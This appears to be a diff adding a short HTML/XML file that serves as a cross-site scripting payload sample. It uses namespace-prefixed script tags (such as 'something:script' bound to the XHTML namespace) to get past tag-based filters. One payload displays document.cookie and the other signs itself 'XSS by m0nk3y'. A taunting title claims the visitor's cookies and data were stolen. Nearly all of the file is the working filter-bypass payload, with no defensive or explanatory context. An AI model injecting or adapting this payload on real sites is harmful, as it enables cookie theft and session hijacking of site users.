@@ -1,0 +1,14 @@
+<html>
+        <head></head>
+        <body>
+                <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.cookie)</something:script>
+                <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert("XSS by m0nk3y")</a:script>
+                <info>
+                  <name>
+                    <title>I have stole your cookies and data, this site maybe seem legitimate but it isn't</title>
+                  </name>
+                </info>
+        </body>
+</html>
+
+
